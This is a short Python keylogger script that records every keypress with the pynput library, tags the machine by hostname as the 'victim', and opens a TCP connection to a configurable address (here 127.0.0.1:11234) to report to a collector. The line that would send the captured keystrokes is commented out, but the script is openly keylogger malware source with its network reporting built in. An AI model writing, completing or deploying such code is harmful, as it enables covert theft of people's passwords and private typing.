#!/usr/bin/env python3
from pynput import keyboard
from threading import Timer
import socket


class Keylogger:
    def __init__(self, interval, ip, port, h_length):
        self.interval = interval
        self.log = ""
        pc_name = socket.gethostname()
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((ip, port))
        self.client_socket.setblocking(False)
        self.victim = pc_name.encode('utf-8')
        start_header = f"{len(pc_name):<{h_length}}".encode('utf-8')
        self.client_socket.send(start_header + self.victim)

    # function to add keys 2 the current ones
    def _append_to_log(self, string):
        self.log = self.log + string

    # process the pressed key
    def _process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self._append_to_log(current_key)

    # function to print the user input in the given interval
    def _report(self):
        # self.client_socket.send(self.log.encode('utf-8'))
        self.log = ""
        timer = Timer(self.interval, self._report)
        timer.start()

    def start(self):
        # listening the user input
        keyboard_listener = keyboard.Listener(on_press=self._process_key_press)
        with keyboard_listener:
            # starts printing keys on the screen
            self._report()
            # waiting the listener to finish
            keyboard_listener.join()


# adding a print interval of 10 seconds
keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
# starting the keyloggger
keylogger.start()
